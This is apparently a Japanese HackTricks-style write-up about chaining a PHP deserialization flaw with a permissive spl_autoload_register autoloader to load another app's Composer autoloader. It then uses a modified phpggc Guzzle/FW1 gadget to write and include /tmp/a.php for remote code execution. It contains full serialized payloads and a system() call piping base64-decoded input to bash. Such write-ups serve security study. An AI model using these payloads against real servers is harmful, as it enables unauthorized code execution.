# PHP - デシリアライズ + オートロードクラス

{{#include ../../banners/hacktricks-training.md}}

まず、[**オートロードクラス**](https://www.php.net/manual/en/language.oop5.autoload.php)が何であるかを確認する必要があります。

## PHP デシリアライズ + spl_autoload_register + LFI/Gadget

私たちは、**`phpggc`**内に脆弱なガジェットを持たない**ウェブアプリでのPHPデシリアライズ**を見つけた状況にいます。しかし、同じコンテナ内には**脆弱なライブラリを持つ別のコンポーザーウェブアプリ**がありました。したがって、目標は**別のウェブアプリのコンポーザーローダーをロードし**、それを悪用して**デシリアライズに脆弱なウェブアプリのライブラリをガジェットで攻撃すること**でした。

手順：

- **デシリアライズ**を見つけ、現在のアプリコードには**ガジェットが存在しない**
- 次のような**`spl_autoload_register`**関数を悪用して、**`.php`拡張子のローカルファイルをロードする**
- そのために、クラス名が**`$name`**内に入るデシリアライズを使用します。シリアライズされたオブジェクトのクラス名には**"/"や"."**を使用できませんが、**コード**は**アンダースコア**("\_")を**スラッシュ**("/")に**置き換えています**。したがって、`tmp_passwd`のようなクラス名は`/tmp/passwd.php`に変換され、コードはそれをロードしようとします。\
**ガジェットの例**は次のようになります：**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> **ファイルアップロード**があり、**`.php`拡張子**のファイルをアップロードできる場合は、この機能を**直接悪用**して、すでにRCEを取得できます。

私の場合、そのようなものはありませんでしたが、**同じコンテナ**内に**`phpggc`ガジェットに脆弱なライブラリ**を持つ別のComposerウェブページがありました。

- この別のライブラリを読み込むには、まず**その別のウェブアプリのComposerローダーを読み込む必要があります**（現在のアプリケーションのものでは他のライブラリにアクセスできません）。**アプリケーションのパスを知っていれば**、次のように非常に簡単に実現できます：**`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、Composerローダーは`/www/frontend/vendor/autoload.php`にありました）
- さて、他の**アプリのComposerローダーを読み込む**ことができるので、**使用するための`phpgcc`** **ペイロードを生成する**時です。私の場合、**`Guzzle/FW1`**を使用し、これにより**ファイルシステム内の任意のファイルを書き込む**ことができました。
- 注：**生成されたガジェットは機能しませんでした**。機能させるために、**`chain.php`**のphpggcペイロードを**修正**し、クラスの**すべての属性**を**privateからpublicに**設定しました。そうしないと、文字列をデシリアライズした後、作成されたオブジェクトの属性には値がありませんでした。
- これで、**他のアプリのComposerローダーを読み込む方法**があり、**機能するphpggcペイロード**も手に入れましたが、**ガジェットが使用されるときにローダーが読み込まれるためには、同じリクエストでこれを行う必要があります**。そのため、次のように両方のオブジェクトを含むシリアライズされた配列を送信しました：
- **最初にローダーが読み込まれ、その後にペイロードが表示される**のがわかります。
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- さて、**ファイルを作成して書き込む**ことはできますが、ユーザーは**ウェブサーバー内の任意のフォルダーに書き込むことができません**。したがって、ペイロードに見られるように、PHPが**`system`**を呼び出し、いくつかの**base64**が**`/tmp/a.php`**に作成されます。次に、**最初のタイプのペイロードを再利用**して、他のウェブアプリのコンポーザーローダーを読み込むために、生成された**`/tmp/a.php`**ファイルを読み込みます。それをデシリアライズガジェットに追加するだけです:&#x20;
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**ペイロードの概要**

- **同じコンテナ内の別のウェブアプリのcomposerオートロードを読み込む**
- **phpggcガジェットを読み込む** ことで、他のウェブアプリのライブラリを悪用する（最初のウェブアプリはデシリアライズに脆弱で、ライブラリにガジェットがなかった）
- ガジェットは、/tmp/a.phpに悪意のあるコマンドを含む**PHPペイロードのファイルを作成する**
- ペイロードの最終部分は、**生成されたPHPファイルを読み込む**ことでコマンドを実行する

私はこのデシリアライズを**2回呼び出す必要があった**。私のテストでは、最初の時に`/tmp/a.php`ファイルが作成されたが読み込まれず、2回目には正しく読み込まれた。 

{{#include ../../banners/hacktricks-training.md}}
